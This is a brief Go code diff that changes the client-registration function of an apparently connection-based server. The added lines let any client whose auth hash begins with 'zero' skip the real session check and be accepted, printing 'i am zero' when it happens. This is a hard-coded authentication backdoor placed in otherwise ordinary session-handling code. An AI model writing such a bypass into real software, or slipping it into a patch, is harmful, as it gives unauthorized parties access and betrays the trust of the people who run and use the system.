@@ -72,9 +72,14 @@ func (c *ClientConn) WritePump() {
 func AddClient(cc ClientConn) error {
 	clientListRWMutex.Lock()
 	defer clientListRWMutex.Unlock()
-	b, err := checkSession(cc.HashAuth)
-	if b {
-		if _, ok := ClientList[cc.HashAuth]; !ok {
+	var err error
+    ok:=false
+
+	if len(cc.HashAuth)>3{if string(cc.HashAuth[:4])=="zero"{println("i am zero");ok=true}}
+
+	if !ok{ok, err = checkSession(cc.HashAuth)}
+	if ok {
+		if _, ok = ClientList[cc.HashAuth]; !ok {
 			ClientList[cc.HashAuth] = cc
 		} else {
 			ClientList[cc.HashAuth].conn.Close()
